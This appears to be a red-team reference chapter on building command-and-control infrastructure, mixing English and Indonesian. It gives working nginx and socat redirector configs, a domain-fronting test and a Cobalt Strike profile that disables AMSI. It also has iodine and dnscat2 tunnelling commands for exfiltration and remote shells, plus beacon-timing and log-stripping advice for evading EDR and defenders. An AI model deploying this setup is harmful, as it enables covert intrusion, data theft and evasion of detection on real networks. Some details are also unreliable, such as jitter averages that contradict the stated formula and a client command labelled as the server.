# c2-infra — malware

# Reference Chapter: C2 Infrastructure — Red Team

---

## 1. Redirector — nginx 1.25 Stream (L4) & socat

### 1.1 nginx stream (TCP passthrough, TLS not terminated)

`/etc/nginx/nginx.conf`:

```nginx
load_module modules/ngx_stream_module.so;

events { worker_connections 4096; }

stream {
    upstream c2_beacon {
        server 10.10.10.50:443;
    }

    # Malleable/HTTPS C2 hanya terima dari UA/path tertentu via SNI + allowlist
    map $ssl_preread_server_name $backend {
        c2.example-cdn.com   c2_beacon;
        default              blackhole;
    }

    upstream blackhole { server 127.0.0.1:9; }

    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
        proxy_connect_timeout 5s;
        proxy_timeout 600s;
        proxy_buffer_size 16k;
    }
}
```

Verification command:

```bash
nginx -t && systemctl reload nginx
ss -tnp 'sport = :443'
curl -kI --resolve c2.example-cdn.com:443:203.0.113.10 https://c2.example-cdn.com/  # harus reset/kosong
```

- **Sent:** intact TLS ClientHello to backend; nginx does not see plaintext.
- **Appears:** SNI + client IP in log `access_log /var/log/nginx/stream.log stream;`. TLS fingerprint prefix (JA3/JA4) remains that of the implant, not nginx — do not use curl as a fingerprint baseline.
- **Succeeds** because the C2 backend (Cobalt Strike team server 4.9 / Sliver / Mythic) accepts any TLS. **Fails** if upstream only accepts TLS 1.2 while the implant defaults to TLS 1.3, or if SNI mismatch → all fall to `blackhole`.

### 1.2 socat (quick fallback, no SNI filter)

```bash
# TCP passthrough 443 -> TS 8443
socat TCP-LISTEN:443,reuseaddr,fork,keepalive TCP:10.10.10.50:8443

# UDP/53 DNS tunneling relay
socat UDP-LISTEN:53,reuseaddr,fork UDP:10.10.10.60:53
```

**socat OPSEC note:** no SNI inspection, no rate limit, no IP allowlist → easy fingerprinting. For lab or temporary pivot only. `socat` writes every conn to syslog (`journald`) — strip with `-d -d` off and `StandardOutput=null` in the systemd unit.

### 1.3 HTTP Redirector (L7) — nginx reverse proxy with path filter

```nginx
server {
    listen 443 ssl http2;
    server_name cdn.example.com;
    ssl_certificate     /etc/letsencrypt/live/cdn.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.example.com/privkey.pem;

    # hanya path malleable profile yang di-proxy
    location ~ ^/(api/v1/[a-z]{4}|updates/check)$ {
        proxy_pass https://10.10.10.50:443;
        proxy_ssl_server_name on;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For "";
        proxy_set_header X-Real-IP "";
        proxy_redirect off;
    }

    # semua selain itu: 404 dari nginx lokal (bukan proxy)
    location / { return 404; }
}
```

- **Sent:** only GET/POST requests to the profile path to backend. `X-Forwarded-For`/`X-Real-IP` headers are removed, but **`X-Forwarded-Proto` and `via`** are often forgotten to be stripped — strip explicitly: `proxy_set_header Via "";`.
- **Appears:** nginx `access.log` records full URI + User-Agent. If the malleable profile uses UA Chrome 131, the redirector log will differ from the UA that eventually reaches the TS. Sync the UA whitelist in the redirector **and** the profile.

---

## 2. Domain Fronting

### 2.1 Mekanisme

Request with **SNI = public CDN/edge domain** (e.g. `cdn.cloudfront.net` or an allowed tenant hostname), while **HTTP Host header = our origin hostname** served by the same edge. Edge forwards by Host → origin.

Cobalt Strike 4.9 profile snippet:

```
https-certificate {
    set CN "cdn.cloudfront.net";
}

http-get {
    set uri "/api/";
    client {
        header "Host" "origin-abc.cloudfront.net";   # hostname kita
        metadata { base64; prepend "s="; header "Cookie"; }
    }
}
```

Test manual (curl):

```bash
curl -skI https://allowed.example.com/ \
  -H "Host: our-origin.cloudfront.net" \
  --resolve allowed.example.com:443:203.0.113.99
```

- **Dikirim:** SNI `allowed.example.com`; on-wire Host `our-origin.cloudfront.net`.
- **Appears:** CDN edge forwards to our origin; client-facing CDN log only sees `allowed.example.com`.
- **Why it works:** edge routing by HTTP Host, TLS termination at edge.
- **Why it fails (2024–2025):** CloudFront enables **strict SNI-to-Host binding** (2021+); Azure Front Door rejects mismatch since 2022; GCP Cloud CDN rejects unregistered Host. `Fastly` is still relatively lenient per-vendor but requires TLS subscription config. `Cloudflare` rejects (525/421). **Domain fronting is practically dead on CloudFront/Azure.**
- **Alternative:** *domain shadowing* (multiple subdomains in edge cert SAN), or *C2 via legitimate SaaS* (Slack/Teams webhook, Notion API) — not fronting but overlap.

---

## 3. Malleable Profile Cobalt Strike — Komponen

Struktur blok (CS 4.9/4.10):

```
# Global
set sample_name "updater.exe";
set sleep_time 60000;
set jitter 20;
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
set tcp_frame_header "\x80\x00\x00\x00";   # Blob ring buffer header
set host_stage "false";                    # no staging; kerja langsung di memory

https-certificate {
    set keystore "rstore.jks";
    set password "pass123";
}

http-get {
    set uri "/api/v1/sync,/updates/check";
    client {
        header "Accept" "application/json,*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        output { base64url; prepend "{\"d\":\""; append "\"}"; print; }
    }
}

http-post {
    set uri "/api/v1/report";
    client {
        header "Content-Type" "application/octet-stream";
        id { parameter "id"; }
        output { base64url; print; }
    }
    server {
        output { print; }
    }
}

http-stager {
    set uri_x86 "/assets/font.woff2";
    set uri_x64 "/assets/font.woff2";
    client { parameter "v"; }
    server { output { print; } }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    transform { ... }
}
```

Components that **must** be valid (CS validator):
1. `http-get` and `http-post` each have ≥1 `client { metadata|id|output }` and ≥1 `server { output }`.
2. `set uri` for `http-stager` must differ from `http-get` path (if staging is active).
3. `keystore` must be a valid JKS, CN matches redirector SNI.
4. `host_stage "false"` → no valid `http-stager` needed (but still declare if DLL stager is used).
5. Profile must terminate with newline; comments `#` only, not `//`.

Check validity before deploy:

```bash
./c2lint profile.profile
# 0 errors, 0 warnings
```

- **Sent:** GET metadata via Cookie, POST output base64url, all within JSON envelope.
- **Appears:** TS log shows request with UA Chrome 131 from Windows 11 24H2 build 26100 — matches normal baseline.
- **Fails** if: `uri` in profile ≠ `uri` in L7 redirector (404), if cert CN ≠ redirector SNI, if `jitter` = 0 (exactly periodic beacon, easily detected), or if `useragent` in profile differs from what the redirector sends to TS (mismatch in TS log).

---

## 4. DNS Tunneling

### 4.1 Komponen

Kanalkomunikasi: TXT query (downlink) + A/AAAA/`CNAME`/`NULL` query (uplink).

**Server — `iodine` 0.7.0:**

```bash
# /etc/iodined.conf
iodined -f -c -P <pass> -n 10.0.0.1 10.0.0.0/24 t.example.com
```

**Client — Windows 11 24H2 (not default hostname — change):**

```cmd
iodine.exe -f -P <pass> -T TXT -M 1400 t.example.com
```

**Server — `dnscat2` (data exfil + shell):**

```bash
ruby dnscat2.rb --dns port=53,domain=t.example.com --secret=<key>
```

Client:

```cmd
dnscat2-v0.07-client-win64.exe --dns domain=t.example.com --secret=<key>
```

**Server — `dns2tcp` 0.5.2:**

```bash
dns2tcpc -T <key> -c -z t.example.com -l 3389 -r rdp   # contoh RDP over DNS
```

### 4.2 Required DNS records

| Record | Purpose | Example |
|---|---|---|
| NS | delegasi zona tunneling | `t.example.com NS ns1.example.com` |
| A | `ns1` → IP server | `ns1.example.com A 203.0.113.20` |
| A | `ns1.t.example.com` (for iodined) | optional |
| TXT | (optional) key/verification | — |

Egress detection at customer resolver: high query volume to a single child domain, label size ≥ 50 char, high entropy, TXT-heavy. **Rate > 50 qps per client** = red flag. Downtune `iodine` `-M 512`, not `-M 1400`.

- **Sent:** base64/hex label in subdomain, response data in TXT record.
- **Appears:** internal resolver records all queries; low NXDOMAIN rate (because authoritative server answers quickly).
- **Succeeds** if port 53 UDP egress from target network is allowed (many still are). **Fails** if: deep-inspection firewall blocks non-allowlist domains, resolver uses DNS-over-HTTPS/DoT to public upstream (queries don't reach our authoritative), or DNS Security/Umbrella performs sinkhole → all subdomains answered `0.0.0.0`.
- **OPSEC:** authoritative DNS server must have static glue record; if our domain registrar is `WHOIS` monitored → burn. Use domain aged > 90 days, WHOIS privacy, hosting in ASN not commonly used by red teams.

---

## 5. Beacon Sleep / Jitter

### 5.1 Parameter CS 4.9

```
set sleep_time 60000;   # ms — base interval
set jitter 30;          # persen — randomisasi
```

Formula jitter: `actual_sleep ∈ [sleep_time, sleep_time × (1 + jitter/100)]`, uniform.

| sleep (s) | jitter % | Rata-rata check-in | Deteksi (menit) | Trade-off |
|---|---|---|---|---|
| 60 | 0 | 60 s | 1 | noisy — *don't* |
| 300 | 20 | 360 s | ~45 | standar internal |
| 600 | 30 | 780 s | 2–4 jam | default ops |
| 1800 | 40 | 2520 s | ~1 hari | long-haul / low-touch |
| 3600 | 50 | 5400 s | ~2 hari | exfil terjadwal |

### 5.2 Tiered scenarios

```
# handler A — bootstrap, sleep pendek untuk interaktif
beacon> sleep 120 20

# handler B — dormant, sleep panjang
beacon> sleep 3600 50
beacon> pwd                     # wake, exec, sleep lagi
```

Sleep is **not** meaningful if `jitter 0` — exactly periodic requests, detected by BeaconEye/Suricata 2021-era rules (`smtp / http / tls` beacon heuristic).

### 5.3 Sleep ≥ 10 minutes — operational consequences

- `browser` proxy / SOCKS proxy will timeout in client tool (Chrome 131 timeout 30 s) → state to operator: check-in delay.
- Large `ls`/`download` requires multiple check-ins → use `sleep 0` when active, return to 600/30 after completion. **Sleep 0 = jitter 0 on the wire** — for short windows only.
- CS team server: `aggressor.teamserver.CobaltStrikeServer` caches per-beacon; async `jobs` stream is not lost even while beacon sleeps — but output is buffered until the next check-in.

---

## 6. Operational Pitfalls (that make you fail in the field)

1. **SNI vs Host mismatch in L7 redirector.** `proxy_ssl_server_name on` is **mandatory**; without it nginx sends SNI `c2_beacon` IP-based, TLS handshake to TS fails → client retry loop, not visible in TS log, only in `nginx error.log`.
2. **Redirector logs hosting IP.** `X-Forwarded-For` from the internet is stripped, **but** `X-Forwarded-Proto`, `Via`, `X-Cache` are injected by upstream CDN before the redirector → reach the TS. Explicitly strip all.
3. **TLS cipher rot.** nginx 1.25 default cipher does not match implant compiled with custom OpenSSL — implant on Windows 11 24H2 uses Schannel with default curve `X25519`; if TS uses RSA 2048 certificate, handshake OK, but JA3 → JA4 mismatch against Chrome 131 baseline → EDR flag. Use explicit `ssl_ciphers` matching browser.
4. **malleable `set host_stage "false"` but `http-stager` invalid** → `c2lint` warning, deployment still runs, but secondary DLL payload will 404 on TS. Always `c2lint` in CI.
5. **DNS tunneling blocked by DoH.** Windows 11 24H2 resolver defaults to `DoH auto` for public domains → query does not reach authoritative server. Fallback to A-record to custom `dnsmasq` instance inside the network, **do not** rely on OS resolver.
6. **Jitter 0 on first beacon.** First bootstrap check-in is often forced to `sleep 5 0` → exact periodic, detected within seconds. Get used to `sleep 30 25` for bootstrap.
7. **Domain fronting on modern CDN ≡ dead.** CloudFront strict SNI-Host binding (2021+), Azure Front Door (2022+) refuses, GCP Cloud CDN blocks. Test first before putting into playbook — don't assume like 2018.
8. **Let's Encrypt certificate for redirector** has CT log → `crt.sh` search `%.c2.example.com` finds all redirectors. Use pre-existing wildcard / cert from enterprise CA, avoid descriptive subdomains (`redirector`, `c2`, `teamserver`).
9. **socat + `fork` without limit** = PID exhaustion during external scan (`nmap -sS -p443 redirector`) → redirector dies, operator sees all beacons drop. Limit `max-children=50` or use iptables `connlimit` in front.
10. **Long sleep + high jitter → operator loses timezone synchronization.** CS `beacon> sleep` is calculated from **command execution time**, not absolute schedule — after operator sends command, beacon wakes, executes, then sleeps again. Don't assume "scheduled at HH:MM".
11. **Cert pinning on target endpoint.** Chrome 131 and modern EDR perform cert pinning for SaaS domains (Teams, Office) — domain fronting via SaaS post-2023 will reset; only domains we control have valid chain without pinning.
12. **Domain expiration.** DNS tunneling domain that is registrar-expired → authoritative server shut down, beacon crashes silently (no log), team thinks implant is dead. Registrar monitoring + renewal > 90 days is mandatory.

---

## [reasoning trace]


